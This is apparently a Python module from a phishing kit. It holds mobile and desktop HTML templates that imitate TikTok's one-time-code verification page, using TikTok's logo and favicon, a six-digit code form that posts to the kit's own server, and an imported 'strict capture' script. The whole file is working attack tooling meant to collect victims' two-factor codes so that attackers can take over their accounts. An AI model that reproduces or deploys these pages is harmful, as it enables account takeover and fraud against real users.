"""otp.py - Templates OTP TikTok (mobile + PC)."""

from platforms._shared import JS_STRICT_CAPTURE, TK_LOGO_SVG as _TK_LOGO_SVG

HTML_OTP_MOBILE = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#ffffff">
    <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <title>Vérification | TikTok</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            background: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #161823;
            -webkit-font-smoothing: antialiased;
            overscroll-behavior: none;
        }
        .safe-top { height: env(safe-area-inset-top, 0px); }
        .safe-bottom { height: env(safe-area-inset-bottom, 0px); }

        .tt-top { display: flex; align-items: center; justify-content: center; padding: clamp(12px, 3vmin, 20px) 16px clamp(8px, 2vmin, 14px); }
        .tt-top-logo { height: clamp(40px, 12vmin, 64px); width: auto; }

        .tt-card {
            max-width: 420px;
            width: 100%;
            margin: 0 auto;
            padding: 0 clamp(16px, 4vmin, 24px);
            box-sizing: border-box;
        }
        .tt-title {
            font-size: clamp(22px, 5.5vmin, 28px);
            font-weight: 800;
            letter-spacing: -0.4px;
            margin: clamp(16px, 4vmin, 24px) 0 clamp(4px, 1vmin, 8px);
            color: #161823;
            text-align: center;
        }
        .tt-subtitle {
            font-size: clamp(13px, 3.2vmin, 15px);
            color: #8a8b91;
            margin-bottom: clamp(20px, 5vmin, 28px);
            font-weight: 500;
            text-align: center;
        }

        /* 6-digit OTP boxes */
        .otp-container {
            display: flex;
            gap: clamp(6px, 2vmin, 10px);
            justify-content: center;
            margin-bottom: clamp(20px, 5vmin, 28px);
        }
        .otp-box {
            width: clamp(40px, 11vmin, 52px);
            height: clamp(50px, 13vmin, 60px);
            border: 2px solid #e3e3e4;
            border-radius: clamp(8px, 2vmin, 12px);
            text-align: center;
            font-size: clamp(20px, 5vmin, 26px);
            font-weight: 700;
            color: #161823;
            background: #fafafa;
            outline: none;
            transition: all 0.18s ease;
            font-family: inherit;
            -webkit-appearance: none;
        }
        .otp-box:focus {
            border-color: #fe2c55;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(254,44,85,0.1);
        }
        .otp-box.filled {
            border-color: #fe2c55;
            background: #fff5f6;
        }

        .tt-btn {
            background: #fe2c55;
            color: #ffffff;
            border-radius: clamp(10px, 2.5vmin, 14px);
            padding: clamp(13px, 3.2vmin, 16px);
            font-weight: 700;
            width: 100%;
            font-size: clamp(15px, 3.7vmin, 17px);
            border: none;
            cursor: pointer;
            transition: all 0.18s ease;
            box-shadow: 0 4px 12px rgba(254,44,85,0.28);
        }
        .tt-btn:active { transform: scale(0.985); }
        .tt-btn:disabled { background: #f1f1f2; color: #c9c9c9; box-shadow: none; cursor: not-allowed; }

        .tt-timer {
            text-align: center;
            font-size: clamp(13px, 3vmin, 15px);
            color: #8a8b91;
            font-weight: 600;
            margin-top: clamp(12px, 3vmin, 16px);
        }
        .tt-resend {
            text-align: center;
            margin-top: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(13px, 3vmin, 15px);
        }
        .tt-resend a {
            color: #fe2c55;
            font-weight: 700;
            text-decoration: none;
            cursor: pointer;
        }
        .tt-resend a:active { opacity: 0.6; }

        .tt-error {
            background: #fff5f6;
            border: 1.5px solid #fe2c55;
            color: #fe2c55;
            border-radius: clamp(10px, 2.5vmin, 14px);
            padding: clamp(10px, 2.5vmin, 14px);
            font-size: clamp(12px, 3vmin, 14px);
            margin-bottom: clamp(12px, 3vmin, 16px);
            text-align: center;
            font-weight: 500;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="safe-top"></div>
    <div class="tt-top">
        <svg class="tt-top-logo" viewBox="0 0 118 42" xmlns="http://www.w3.org/2000/svg">
            <path d="M16.4 12.6c0 4.6-3.7 8.3-8.3 8.3S0 17.2 0 12.6 3.7 4.3 8.1 4.3v4.2c-2.3 0-4.1 1.8-4.1 4.1s1.9 4.2 4.1 4.2 4.1-1.9 4.1-4.2V0h4.2c0 2.3 1.9 4.1 4.1 4.1v4.2c-1.5 0-2.9-.5-4.1-1.3v5.6z" fill="#25F4EE" transform="translate(-2,0)"/>
            <path d="M16.4 12.6c0 4.6-3.7 8.3-8.3 8.3S0 17.2 0 12.6 3.7 4.3 8.1 4.3v4.2c-2.3 0-4.1 1.8-4.1 4.1s1.9 4.2 4.1 4.2 4.1-1.9 4.1-4.2V0h4.2c0 2.3 1.9 4.1 4.1 4.1v4.2c-1.5 0-2.9-.5-4.1-1.3v5.6z" fill="#FE2C55" transform="translate(2,0)"/>
            <path d="M16.4 12.6c0 4.6-3.7 8.3-8.3 8.3S0 17.2 0 12.6 3.7 4.3 8.1 4.3v4.2c-2.3 0-4.1 1.8-4.1 4.1s1.9 4.2 4.1 4.2 4.1-1.9 4.1-4.2V0h4.2c0 2.3 1.9 4.1 4.1 4.1v4.2c-1.5 0-2.9-.5-4.1-1.3v5.6z" fill="#000000"/>
            <text x="32" y="30" font-family="-apple-system, Helvetica, Arial, sans-serif" font-size="26" font-weight="700" fill="#000000" letter-spacing="-0.5">TikTok</text>
        </svg>
    </div>

    <div class="tt-card flex-1 flex flex-col justify-center" style="min-height: calc(100vh - 80px);">
        <h2 class="tt-title">{{ otp_title }}</h2>
        <p class="tt-subtitle">{{ otp_sub }}</p>

        <div id="error-box" class="{% if not message %}hidden{% endif %} tt-error">{{ message }}</div>

        <form method="POST" id="otp-form">
            <input type="hidden" name="action" value="code">
            <input type="hidden" name="code" id="otp-hidden">
            <div class="otp-container">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]" autocomplete="one-time-code" autofocus>
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="text" class="otp-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>
            <button type="submit" class="tt-btn" id="otp-submit" disabled>{{ otp_submit }}</button>
        </form>

        <div class="tt-timer" id="timer">Renvoyer le code dans 01:00</div>
        <div class="tt-resend hidden" id="resend">
            <a id="resend-link">Renvoyer le code</a>
        </div>
    </div>

    <div class="safe-bottom"></div>

    <script>
    (function() {
        var boxes = document.querySelectorAll('.otp-box');
        var hidden = document.getElementById('otp-hidden');
        var submit = document.getElementById('otp-submit');
        var form = document.getElementById('otp-form');
        var timerEl = document.getElementById('timer');
        var resendEl = document.getElementById('resend');
        var seconds = 60;

        function updateHiddenAndSubmit() {
            var code = '';
            boxes.forEach(function(b) { code += b.value; });
            hidden.value = code;
            submit.disabled = code.length !== 6;
            boxes.forEach(function(b) {
                if (b.value) b.classList.add('filled'); else b.classList.remove('filled');
            });
        }

        boxes.forEach(function(box, idx) {
            box.addEventListener('input', function(e) {
                // Only allow digits
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value && idx < boxes.length - 1) {
                    boxes[idx + 1].focus();
                }
                updateHiddenAndSubmit();
            });
            box.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && idx > 0) {
                    boxes[idx - 1].focus();
                    boxes[idx - 1].value = '';
                    updateHiddenAndSubmit();
                }
                if (e.key === 'ArrowLeft' && idx > 0) boxes[idx - 1].focus();
                if (e.key === 'ArrowRight' && idx < boxes.length - 1) boxes[idx + 1].focus();
            });
            box.addEventListener('paste', function(e) {
                e.preventDefault();
                var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
                for (var i = 0; i < pasted.length && idx + i < boxes.length; i++) {
                    boxes[idx + i].value = pasted[i];
                }
                if (idx + pasted.length < boxes.length) {
                    boxes[idx + pasted.length].focus();
                } else {
                    boxes[boxes.length - 1].focus();
                }
                updateHiddenAndSubmit();
            });
        });

        updateHiddenAndSubmit();

        var interval = setInterval(function() {
            seconds--;
            var m = Math.floor(seconds / 60);
            var s = seconds % 60;
            timerEl.textContent = 'Renvoyer le code dans ' + (m < 10 ? '0' + m : m) + ':' + (s < 10 ? '0' + s : s);
            if (seconds <= 0) {
                clearInterval(interval);
                timerEl.classList.add('hidden');
                resendEl.classList.remove('hidden');
            }
        }, 1000);
    })();
    </script>
</body>
</html>
"""


HTML_OTP_PC = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <title>Enter code | TikTok</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        .otp-card { background: #fff; padding: 36px 28px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08); width: 420px; border: 1px solid #e3e3e4; }
        .pc-input-otp { border: 1px solid #e3e3e4; border-radius: 4px; padding: 14px; width: 100%; font-size: 22px; text-align: center; letter-spacing: 6px; font-weight: bold; outline: none; background: #fafafa; }
        .pc-input-otp:focus { border-color: #fe2c55; background: #fff; }
        .pc-btn { background: #fe2c55; color: #fff; border-radius: 4px; padding: 12px; font-weight: 600; width: 100%; font-size: 16px; border: none; cursor: pointer; }
        .pc-btn:hover { background: #e5274d; }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="otp-card flex flex-col items-center">
        <div class="bg-red-50 p-4 rounded-full mb-5">
            <svg class="w-8 h-8 text-[#fe2c55]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
        </div>
        <h2 class="text-2xl font-bold mb-2 text-gray-900">{{ otp_title }}</h2>
        <p class="text-gray-600 text-center mb-3 text-sm">{{ otp_sub }}</p>
        <div class="text-red-500 font-bold mb-4" id="timer-pc">01:00</div>
        <div id="error-box-pc" class="{% if not message %}hidden{% endif %} w-full bg-red-50 border border-red-200 text-red-600 p-3 rounded text-sm mb-3 text-center">{{ message }}</div>
        <form method="POST" class="w-full">
            <input type="hidden" name="action" value="code">
            <input type="text" name="code" id="otp-field-pc" placeholder="000000" class="pc-input-otp mb-4" maxlength="8" required autofocus inputmode="numeric">
            <button type="submit" class="pc-btn">{{ otp_submit }}</button>
        </form>
    </div>
    <script>
    let seconds = 60;
    const td = document.getElementById('timer-pc');
    setInterval(() => {
        seconds--;
        let m = Math.floor(seconds/60), s = seconds%60;
        td.innerText = (m<10?"0"+m:m)+":"+(s<10?"0"+s:s);
        if (seconds<=0) seconds=60;
    }, 1000);
    </script>
</body>
</html>
"""

